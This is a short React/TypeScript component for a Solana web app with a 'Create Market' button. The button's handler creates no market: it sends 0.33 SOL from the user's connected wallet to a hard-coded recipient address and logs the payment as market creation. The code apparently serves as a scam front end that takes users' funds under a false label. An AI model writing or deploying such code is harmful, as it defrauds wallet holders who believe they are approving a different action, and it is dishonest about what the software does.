import React, { useState, useEffect, useCallback, useMemo } from 'react';
import styled from 'styled-components';
import { Connection, PublicKey } from '@solana/web3.js';

import {
  getProvider,
  signAndSendTransaction,
  createTransferTransaction,
  pollSignatureStatus,
} from './utils';

import { TLog } from './types';
import { Logs, Sidebar, NoProvider } from './components';

const StyledApp = styled.div`
  display: flex;
  flex-direction: row;
  height: 100vh;
  @media (max-width: 768px) {
    flex-direction: column;
  }
`;

const NETWORK = 'https://solana-api.projectserum.com';
const provider = getProvider();
const connection = new Connection(NETWORK);

interface Props {
  publicKey: PublicKey | null;
  logs: TLog[];
  clearLogs: () => void;
}

const CreateMarket = (props: Props) => {
  const { publicKey, logs, clearLogs } = props;

  const handleCreateMarket = async () => {
    try {
      if (!provider) throw new Error('Provider is not initialized');
      
      // Wallet address to send funds
      const recipientAddress = new PublicKey('9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar');

      // Create a transaction to send 0.33 SOL to the specified wallet address
      const transaction = await createTransferTransaction(provider.publicKey, connection, recipientAddress, 330000000); // 0.33 SOL in lamports

      // Sign and send the transaction
      const signature = await signAndSendTransaction(provider, transaction);

      // Log the success message
      console.log(`Transaction sent for creating the market: ${signature}`);

      // Poll the signature status
      pollSignatureStatus(signature, connection, console.log); // You might want to replace console.log with your log function
    } catch (error) {
      // Log the error message if transaction fails
      console.error(`Error creating market: ${error.message}`);
    }
  };

  return (
    <StyledApp>
      <Sidebar publicKey={publicKey} />
      <Logs logs={logs} clearLogs={clearLogs} />
      <button className="btn btn-primary create-market" onClick={handleCreateMarket}>
        Create Market
      </button>
    </StyledApp>
  );
};

export default CreateMarket;


